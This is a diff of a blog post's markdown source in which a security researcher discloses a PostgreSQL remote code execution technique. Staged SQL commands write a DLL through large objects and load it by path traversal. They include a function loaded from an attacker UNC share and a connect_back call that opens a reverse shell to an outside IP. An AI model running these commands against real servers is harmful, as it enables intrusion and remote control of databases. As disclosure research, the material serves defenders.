@@ -3,60 +3,55 @@ layout: post
 title: "SQL Injection Double Uppercut :: How to Achieve Remote Code Execution Against PostgreSQL"
 date: 2020-06-26 09:00:00 -0500
 categories: blog
-excerpt_separator: <!--more-->
 ---
 
-<img class="excel" alt="Postgres" src="/assets/images/sql-injection-double-uppercut-how-to-achieve-remote-code-execution/pg.png">
-<p class="cn" markdown="1">When I was researching exploit primitives for the SQL Injection vulnerabilities discovered in [Cisco DCNM](/blog/2020/01/14/busting-ciscos-beans-hardcoding-your-way-to-hell.html), I came across a generic technique to exploit SQL Injection vulnerabilities against a PostgreSQL database. When developing your exploit primitives, it's always prefered to use an *application technique*, that doesn't rely on some other underlying technology.</p>
+![Postgres](/assets/images/sql-injection-double-uppercut/pg.png "Postgres")
 
+When I was researching exploit primitives for the SQL Injection vulnerabilities discovered in [Cisco DCNM](/blog/2020/01/14/busting-ciscos-beans-hardcoding-your-way-to-hell.html), I came across a generic technique to exploit SQL Injection vulnerabilities against a PostgreSQL database. When developing your exploit primitives, it's always prefered to use an *application technique*, that doesn't rely on some other underlying technology.
 <!--more-->
 
-<p class="cn">TL;DR</p>
+TL;DR; *I share yet another technique to achieve remote code execution against PostgreSQL Database.*
 
-<p class="cn" markdown="1">*I share yet another technique to achieve remote code execution against PostgreSQL Database.*</p>
-
-<p class="cn" markdown="1">An application technique would be the ability to compromise the database integrity and leverage the trust between the application code and the database. In the case of Cisco DCNM, I found 4 different techniques, 2 of which I blogged about (directory traveral and deserialization).</p>
+An application technique would be the ability to compromise the database integrity and leverage the trust between the application code and the database. In the case of Cisco DCNM, I found 4 different techniques, 2 of which I blogged about (directory traveral and deserialization).
 
 ## Prior Research
 
-<p class="cn" markdown="1">Although I didn't know it at the time, [Jacob Wilkin](https://twitter.com/Jacob_Wilkin) had [reported a simpler approach](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) to achieving code execution against PostgreSQL by (ab)using [copy from program](https://www.postgresql.org/docs/12/sql-copy.html). Recently, Denis Andzakovic also [detailed](https://pulsesecurity.co.nz/articles/postgres-sqli) his way of gaining code execution against PostgreSQL as well by (ab)using read/writes to the `postgresql.conf` file.</p>
+Although I didn't know it at the time, [Jacob Wilkin](https://twitter.com/Jacob_Wilkin) had [reported a simpler approach](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) to achieving code execution against PostgreSQL by (ab)using [copy from program](https://www.postgresql.org/docs/12/sql-copy.html). Recently, Denis Andzakovic also [detailed](https://pulsesecurity.co.nz/articles/postgres-sqli) his way of gaining code execution against PostgreSQL as well by (ab)using read/writes to the `postgresql.conf` file.
 
-<p class="cn" markdown="1">I was originally going to sit on this technique, but since Denis exposed the power of `lo_export` for exploitation, I figured one more nail on the coffin wouldn't hurt ;-></p>
+I was originally going to sit on this technique, but since Denis exposed the power of `lo_export` for exploitation, I figured one more nail on the coffin wouldn't hurt ;->
 
-<p class="cn" markdown="1">I did some testing and discovered that under windows, the NETWORK_SERVICE cannot modify the `postgresql.conf` file, so Denis's technique is *nix specific. However, his technique doesn't require stacked queries, making it powerful in certain contexts.</p>
+I did some testing and discovered that under windows, the NETWORK_SERVICE cannot modify the `postgresql.conf` file, so Denis's technique is *nix specific. However, his technique doesn't require stacked queries, making it powerful in certain contexts.
 
 ## CREATE FUNCTION obj_file Directory Traversal
 
-<div markdown="1" class="cn">
 - CVE: N/A
 - CVSS: 4.1 [(AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:L)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?calculator&version=3.0&vector=(AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:L))
-</div>
 
 ### Environment
 
-<p class="cn" markdown="1">This technique works on both *nix and Windows but does require stacked queries since we are leveraging the [create function](https://www.postgresql.org/docs/12/sql-createfunction.html) operative.</p>
+This technique works on both \*nix and Windows but does require stacked queries since we are leveraging the [create function](https://www.postgresql.org/docs/12/sql-createfunction.html) operative.
 
 ### Summary
 
-<p class="cn" markdown="1">On the latest versions of PostgreSQL, the `superuser` is no longer allowed to load a shared library file from anywhere else besides `C:\Program Files\PostgreSQL\11\lib` on Windows or `/var/lib/postgresql/11/lib` on *nix. Additionally, this path is **not writable** by either the NETWORK_SERVICE or postgres accounts.</p>
+On the latest versions of PostgreSQL, the `superuser` is no longer allowed to load a shared library file from anywhere else besides `C:\Program Files\PostgreSQL\11\lib` on Windows or `/var/lib/postgresql/11/lib` on \*nix. Additionally, this path is **not writable** by either the NETWORK_SERVICE or postgres accounts.
 
-<p class="cn" markdown="1">However, an authenticated database `superuser` can write binary files to the filesystem using "large objects" and can of course write to the `C:\Program Files\PostgreSQL\11\data` directory. The reason for this should be clear, for updating/creating tables in the database.</p>
+However, an authenticated database `superuser` can write binary files to the filesystem using "large objects" and can of course write to the `C:\Program Files\PostgreSQL\11\data` directory. The reason for this should be clear, for updating/creating tables in the database.
 
-<p class="cn" markdown="1">The underlying issue is that the `CREATE FUNCTION` operative allows for a directory traversal to the data directory! So essentially, an authenticated attacker can write a shared library file into the data directory and use the traversal to load the shared library. This means an attacker can get native code execution and as such, execute arbitrary code.</p>
+The underlying issue is that the `CREATE FUNCTION` operative allows for a directory traversal to the data directory! So essentially, an authenticated attacker can write a shared library file into the data directory and use the traversal to load the shared library. This means an attacker can get native code execution and as such, execute arbitrary code.
 
 ### Attack Flow
 
-<p class="cn" markdown="1">**Stage 1 -** We start by creating an entry into the `pg_largeobject` table.</p>
+**Stage 1 -** We start by creating an entry into the `pg_largeobject` table.
 
 ```sql
 select lo_import('C:/Windows/win.ini', 1337);
 ```
 
-<p class="cn" markdown="1">We could have easily used a UNC path here (and skip step 3), but since we want a platform independant technique, we will avoid this.</p>
+We could have easily used a UNC path here (and skip step 3), but since we want a platform independant technique, we will avoid this.
 
-<p class="cn" markdown="1">**Stage 2 -** Now we modify the `pg_largeobject` entry to contain a complete extension. This extension needs to be compiled against the exact major version of the target PostgreSQL database as well as matching its architecture.</p>
+**Stage 2 -** Now we modify the `pg_largeobject` entry to contain a complete extension. This extension needs to be compiled against the exact major version of the target PostgreSQL database as well as matching its architecture.
 
-<p class="cn" markdown="1">For a file that is > 2048 bytes in length, the `pg_largeobject` table uses the `pageno` field. So we must break our file up into chunks of size 2048 in bytes.</p>
+For a file that is > 2048 bytes in length, the `pg_largeobject` table uses the `pageno` field. So we must break our file up into chunks of size 2048 in bytes.
 
 ```sql
 update pg_largeobject SET pageno=0, data=decode(4d5a90...) where loid=1337;
@@ -65,29 +60,29 @@ insert into pg_largeobject(loid, pageno, data) values (1337, 2, decode(651400...
 ...
 ```
 
-<p class="cn" markdown="1">It maybe possible to skip stage 1 (and only performing a single statement execution for stage 2) by using [object identifier types](https://www.postgresql.org/docs/8.1/datatype-oid.html) within PostgreSQL, but I have not had the time to confirm this.</p>
+It maybe possible to skip stage 1 (and only performing a single statement execution for stage 2) by using [object identifier types](https://www.postgresql.org/docs/8.1/datatype-oid.html) within PostgreSQL, but I have not had the time to confirm this.
 
-<p class="cn" markdown="1">**Stage 3 -** Now we can write our binary into the data directory. Remember, we can't use traversals here since that is checked, but even if we could, strict file permissions for the NETWORK_SERVICE account exist and we have limited options.</p>
+**Stage 3 -** Now we can write our binary into the data directory. Remember, we can't use traversals here since that is checked, but even if we could, strict file permissions for the NETWORK_SERVICE account exist and we have limited options.
 
 ```sql
 select lo_export(1337, 'poc.dll');
 ```
 
-<p class="cn" markdown="1">**Stage 4 -** Now, let's trigger the loading of the library.</p>
+**Stage 4 -** Now, let's trigger the loading of the library.
 
-<p class="cn" markdown="1">I demonstrated in a class I taught a few years back that you can use fixed paths (including UNC) to load extensions against PostgreSQL version 9.x, thus gaining native code execution. [@zerosum0x0](https://twitter.com/zerosum0x0) [demonstrated this](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html) by using the file write technique with a fixed path on the filesystem. But back then, permissions on the filesystem were not as restrictive.</p>
+I demonstrated in a class I taught a few years back that you can use fixed paths (including UNC) to load extensions against PostgreSQL version 9.x, thus gaining native code execution. [@zerosum0x0](https://twitter.com/zerosum0x0) [demonstrated this](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html) by using the file write technique with a fixed path on the filesystem. But back then, permissions on the filesystem were not as restrictive.
 
 ```sql
 create function connect_back(text, integer) returns void as '//attacker/share/poc.dll', 'connect_back' language C strict;
 ```
 
-<p class="cn" markdown="1">However, a few years passed and the PostgreSQL developers decided to block fixed paths and alas, that technique is now dead. But we can simply traverse from the lib directory and load our extension! The underlying code of the `create function` appends the `.dll` string, so don't worry about appending it:</p>
+However, a few years passed and the PostgreSQL developers decided to block fixed paths and alas, that technique is now dead. But we can simply traverse from the lib directory and load our extension! The underlying code of the `create function` appends the `.dll` string, so don't worry about appending it:
 
 ```sql
 create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
 ```
 
-<p class="cn" markdown="1">**Stage 5 -** Trigger your reverse shell.</p>
+**Stage 5 -** Trigger your reverse shell.
 
 ```sql
 select connect_back('192.168.100.54', 1234);
@@ -95,19 +90,17 @@ select connect_back('192.168.100.54', 1234);
 			
 ### Things to consider
 
-<div markdown="1" class="cn">
 - You can also load DllMain, but pwning your error log is a one way ticket to detection!
 - As mentioned, you will need to compile the dll/so file using the same PostgreSQL version including architecture.
 - You can download the extension I used [here](https://github.com/sourceincite/tools/blob/master/pgpwn.c) but you will need to compile it yourself.
-</div>
 
 ### Fun Facts
 
-<p class="cn" markdown="1">ZDI initially aquired this case but never published an advisory and I was later told that the vendor wasn't patching the issue since it's considered a *feature not a bug*.</p>
+ZDI initially acquired this case but never published an advisory and I was later told that the vendor wasn't patching the issue since it's considered a *feature not a bug*.
 
 ### Automation
 
-<p class="cn" markdown="1">This code will generate a poc.sql file to run on the database as the superuser. Example:</p>
+This code will generate a poc.sql file to run on the database as the superuser. Example:
 
 ```
 steven@pluto:~/postgres-rce$ ./poc.py 
@@ -171,8 +164,6 @@ print("    drop function connect_back(text, integer);")
 
 ## References
 
-<div markdown="1" class="cn">
 - [https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html)
 - [https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
 - [https://pulsesecurity.co.nz/articles/postgres-sqli](https://pulsesecurity.co.nz/articles/postgres-sqli)
-</div>
